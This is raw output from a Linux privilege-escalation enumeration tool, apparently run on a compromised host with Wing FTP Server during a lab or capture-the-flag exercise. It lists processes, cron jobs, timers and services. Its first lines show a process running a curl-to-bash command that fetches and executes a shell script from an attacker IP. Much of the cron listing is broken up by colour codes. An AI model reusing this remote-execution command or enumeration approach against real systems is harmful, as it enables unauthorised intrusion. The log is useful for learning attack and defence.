Process 3658 ([1;96m[1;95mwingftp[0m[0m) - sh -c curl http://10.10.16.121:8080/shell.sh|bash 
  └─ Has open files:
    └─ pipe:[23875]
    └─ /opt/wftpserver/Log/ssh_debug_log
Process 3660 ([1;96m[1;95mwingftp[0m[0m) - bash 
  └─ Has open files:
    └─ pipe:[22331]
    └─ pipe:[23875]
    └─ /opt/wftpserver/Log/ssh_debug_log

[1;34m╔══════════╣ [1;32mProcesses with memory-mapped credential files [1;90m(T1003.007)
[0m
[1;34m╔══════════╣ [1;32mProcesses whose PPID belongs to a different user (not root) [1;90m(T1134.004)
[0m[1;34m╚ [1;34m[3mYou will know if a user can somehow spawn processes as a different user
[0m
[1;34m╔══════════╣ [1;32mFiles opened by processes belonging to other users [1;90m(T1083)
[0m[1;34m╚ [1;34m[3mThis is usually empty because of the lack of privileges to read other user processes information
[0m
[1;34m╔══════════╣ [1;32mCheck for vulnerable cron jobs [1;90m(T1053.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
[0m[1;34m══╣ [1;32mCron jobs list [1;90m(T1053.003)
[0m/usr/bin/crontab
[1;90mincrontab Not Found
[0m[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m4[1;32m[0m0[1;32m[0m [1;32m[0mJ[1;32m[0ma[1;32m[0mn[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m0[1;32m[0m5[1;32m[0m:[1;32m[0m1[1;32m[0m6[1;32m[0m [1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0mt[1;32m[0ma[1;32m[0mb[1;32m[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0md[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mF[1;32m[0me[1;32m[0mb[1;32m[0m [1;32m[0m [1;32m[0m9[1;32m[0m [1;32m[0m0[1;32m[0m8[1;32m[0m:[1;32m[0m1[1;32m[0m9[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m7[1;32m[0m5[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0mn[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m0[1;32m[0m2[1;32m[0m:[1;32m[0m4[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m1[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0mn[1;32m[0m [1;32m[0m [1;32m[0m6[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m5[1;32m[0m [1;32me2scrub_all[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0md[1;32m[0ma[1;32m[0mi[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m3[1;32m[0m2[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mF[1;32m[0me[1;32m[0mb[1;32m[0m [1;32m[0m [1;32m[0m9[1;32m[0m [1;32m[0m0[1;32m[0m8[1;32m[0m:[1;32m[0m1[1;32m[0m9[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m7[1;32m[0m5[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0mn[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m0[1;32m[0m2[1;32m[0m:[1;32m[0m4[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m5[1;32m[0m3[1;32m[0m9[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m7[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m5[1;32m[0m [1;32mapache2[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m7[1;32m[0m8[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m2[1;32m[0m5[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32mapt-compat[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m2[1;32m[0m6[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32mdpkg[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m3[1;32m[0m7[1;32m[0m7[1;32m[0m [1;32m[0mD[1;32m[0me[1;32m[0mc[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32mlogrotate[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m1[1;32m[0m3[1;32m[0m9[1;32m[0m5[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32mman-db[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0mh[1;32m[0mo[1;32m[0mu[1;32m[0mr[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mF[1;32m[0me[1;32m[0mb[1;32m[0m [1;32m[0m [1;32m[0m9[1;32m[0m [1;32m[0m0[1;32m[0m8[1;32m[0m:[1;32m[0m1[1;32m[0m9[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m7[1;32m[0m5[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0mn[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m0[1;32m[0m2[1;32m[0m:[1;32m[0m4[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0mm[1;32m[0mo[1;32m[0mn[1;32m[0mt[1;32m[0mh[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mF[1;32m[0me[1;32m[0mb[1;32m[0m [1;32m[0m [1;32m[0m9[1;32m[0m [1;32m[0m0[1;32m[0m8[1;32m[0m:[1;32m[0m1[1;32m[0m9[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m7[1;32m[0m5[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0mn[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m0[1;32m[0m2[1;32m[0m:[1;32m[0m4[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0mw[1;32m[0me[1;32m[0me[1;32m[0mk[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mF[1;32m[0me[1;32m[0mb[1;32m[0m [1;32m[0m [1;32m[0m9[1;32m[0m [1;32m[0m0[1;32m[0m8[1;32m[0m:[1;32m[0m1[1;32m[0m9[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m7[1;32m[0m5[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0mn[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m0[1;32m[0m2[1;32m[0m:[1;32m[0m4[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m5[1;32m[0m5[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32mman-db[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m.placeholder[0m
[1;32m[0m
[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0my[1;32m[0me[1;32m[0ma[1;32m[0mr[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m2[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mF[1;32m[0me[1;32m[0mb[1;32m[0m [1;32m[0m [1;32m[0m9[1;32m[0m [1;32m[0m0[1;32m[0m8[1;32m[0m:[1;32m[0m1[1;32m[0m9[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m7[1;32m[0m5[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0mn[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m0[1;32m[0m2[1;32m[0m:[1;32m[0m4[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m.placeholder[0m

SHELL=/bin/sh
PATH=/usr/local/s[1;34mbin:[0m/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	[1;31mroot[0m	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	[1;31mroot[0m	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	[1;31mroot[0m	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	[1;31mroot[0m	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
/etc/crontab:8:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:18:17 *	* * *	root	cd / && [1;31mrun-parts[0m --report /etc/cron.hourly
/etc/crontab:19:25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && [1;31mrun-parts[0m --report /etc/cron.daily; }
/etc/crontab:20:47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && [1;31mrun-parts[0m --report /etc/cron.weekly; }
/etc/crontab:21:52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && [1;31mrun-parts[0m --report /etc/cron.monthly; }

[1;34m══╣ [1;32mCron files with hidden carriage returns [1;90m(T1053.003)
[0m
[1;34m══╣ [1;32mChecking for specific cron jobs vulnerabilities [1;90m(T1053.003)
[0mChecking cron directories...
[1;34m══╣ [1;32mrun-parts executable entries [1;90m(T1053.003)
[0m[/etc/cron.hourly]
[/etc/cron.daily]
/etc/cron.daily/apache2
/etc/cron.daily/apt-compat
/etc/cron.daily/dpkg
/etc/cron.daily/logrotate
/etc/cron.daily/man-db
[/etc/cron.weekly]
/etc/cron.weekly/man-db
[/etc/cron.monthly]


[1;34m╔══════════╣ [1;32mSystem timers [1;90m(T1053.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
[0m[1;34m══╣ [1;32mActive timers: [1;90m(T1053.003)
[0mNEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES
Sun 2026-06-14 02:59:44 EDT 6min left     -                           -                    [1;32msystemd-tmpfiles-clean.timer[0m systemd-tmpfiles-clean.service
Sun 2026-06-14 03:10:23 EDT 17min left    Sun 2026-06-14 02:45:06 EDT 8min ago             [1;32me2scrub_all.timer[0m            e2scrub_all.service
Sun 2026-06-14 03:35:28 EDT 42min left    Mon 2025-11-03 06:41:41 EST 7 months 9 days ago  [1;32mapt-daily-upgrade.timer[0m      apt-daily-upgrade.service
Sun 2026-06-14 04:24:18 EDT 1h 31min left Thu 2026-01-22 04:40:13 EST 4 months 21 days ago [1;32mfstrim.timer[0m                 fstrim.service
Sun 2026-06-14 09:09:32 EDT 6h left       Mon 2025-11-03 09:32:05 EST 7 months 9 days ago  [1;32mman-db.timer[0m                 man-db.service
Sun 2026-06-14 13:55:52 EDT 11h left      Thu 2026-01-22 04:41:48 EST 4 months 21 days ago [1;32mapt-daily.timer[0m              apt-daily.service
Mon 2026-06-15 00:00:00 EDT 21h left      -                           -                    [1;32mdpkg-db-backup.timer[0m         dpkg-db-backup.service
Mon 2026-06-15 00:00:00 EDT 21h left      Sun 2026-06-14 02:44:49 EDT 8min ago             [1;32mlogrotate.timer[0m              logrotate.service
[1;34m══╣ [1;32mDisabled timers: [1;90m(T1053.003)
[0m[1;34m══╣ [1;32mAdditional timer files: [1;90m(T1053.003)
[0m
[1;34m╔══════════╣ [1;32mServices and Service Files [1;90m(T1543.002,T1007)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
[0m
[1;34m══╣ [1;32mActive services: [1;90m(T1543.002,T1007)
[0m[1;32mapache2.service[0m                    loaded active running The Apache HTTP Server
[1;32mapparmor.service[0m                   loaded active exited  Load AppArmor profiles
[1;32mauditd.service[0m                     loaded active running Security Auditing Service
[1;32mconsole-setup.service[0m              loaded active exited  Set console font and keymap
[1;32mcron.service[0m                       loaded active running Regular background program processing daemon
[1;32mdbus.service[0m                       loaded active running D-Bus System Message Bus
[1;32mgetty@tty1.service[0m                 loaded active running Getty on tty1
[1;32mifupdown-pre.service[0m               loaded active exited  Helper to synchronize boot up for ifupdown
  Potential issue in service file: /lib/systemd/system/ifupdown-pre.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32mkeyboard-setup.service[0m             loaded active exited  Set the console keyboard layout
[1;32mkmod-static-nodes.service[0m          loaded active exited  Create List of Static Device Nodes
[1;32mnetfilter-persistent.service[0m       loaded active exited  netfilter persistent configuration
[1;32mnetworking.service[0m                 loaded active exited  Raise network interfaces
  Potential issue in service file: /lib/systemd/system/networking.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32mssh.service[0m                        loaded active running OpenBSD Secure Shell server
[1;32msystemd-binfmt.service[0m             loaded active exited  Set Up Additional Binary Formats
[1;32msystemd-journal-flush.service[0m      loaded active exited  Flush Journal to Persistent Storage
  Potential issue in service file: /lib/systemd/system/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32msystemd-journald.service[0m           loaded active running Journal Service
[1;32msystemd-logind.service[0m             loaded active running User Login Management
[1;32msystemd-modules-load.service[0m       loaded active exited  Load Kernel Modules
[1;32msystemd-random-seed.service[0m        loaded active exited  Load/Save Random Seed
[1;32msystemd-remount-fs.service[0m         loaded active exited  Remount Root and Kernel File Systems
  Potential issue in service: systemd-remount-fs.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
